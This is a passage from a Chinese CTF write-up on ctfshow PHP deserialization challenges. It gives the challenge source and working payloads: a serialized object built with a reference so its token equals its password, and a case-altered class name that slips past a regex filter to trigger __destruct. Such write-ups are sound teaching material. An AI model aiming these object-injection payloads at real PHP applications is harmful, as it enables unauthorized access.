$ctfshow->token=md5(mt_rand());

if($ctfshow->login()){
    echo $flag;
}
```

```php
<?php
class ctfshowAdmin{
    public $token=1;
    public $password=1;


    public function login(){
        return $this->token===$this->password;
    }
}
$a = new ctfshowAdmin();
$a->password=&$a->token;  //用引用
echo urlencode(serialize($a));
```

## web266

```php
<?php

highlight_file(__FILE__);

include('flag.php');
$cs = file_get_contents('php://input'); //文件包含可使用伪协议


class ctfshow{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public function __construct($u,$p){
        $this->username=$u;
        $this->password=$p;
    }
    public function login(){
        return $this->username===$this->password;
    }
    public function __toString(){
        return $this->username;
    }
    public function __destruct(){
        global $flag;
        echo $flag;
    }
}
$ctfshowo=@unserialize($cs);
if(preg_match('/ctfshow/', $cs)){
    throw new Exception("Error $ctfshowo",1);
}
```

POST：

```
O:7:"Ctfshow":2:{s:8:"username";s:6:"xxxxxx";s:8:"password";s:6:"xxxxxx";} //大小写不敏感
```

<img src="图片\Snipaste_2023-02-05_17-09-57.png" alt="Snipaste_2023-02-05_17-09-57" style="zoom:80%;" />





# 好文章

[一篇文章带你深入理解PHP反序列化漏洞](https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/)

[从CTF中学习PHP反序列化的各种利用方式](https://www.secpulse.com/archives/180254.html)

[PHP反序列化从0到1](https://mp.weixin.qq.com/s/UzG1LCNjAeK0aFQswX-yBg)

[利用session.upload_progress进行文件包含和反序列化渗透](https://www.freebuf.com/vuls/202819.html)

[[CTF]PHP反序列化总结](https://blog.csdn.net/solitudi/article/details/113588692?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167550748316800225587282%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=167550748316800225587282&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-113588692-null-null.blog_rank_default&utm_term=%E5%8F%8D%E5%BA%8F%E5%88%97&spm=1018.2226.3001.4450)

[PHP中SESSION反序列化机制](https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm_source=tuicool&utm_medium=referral)

[CRLF的Injection漏洞的利用与实例分析](https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html)
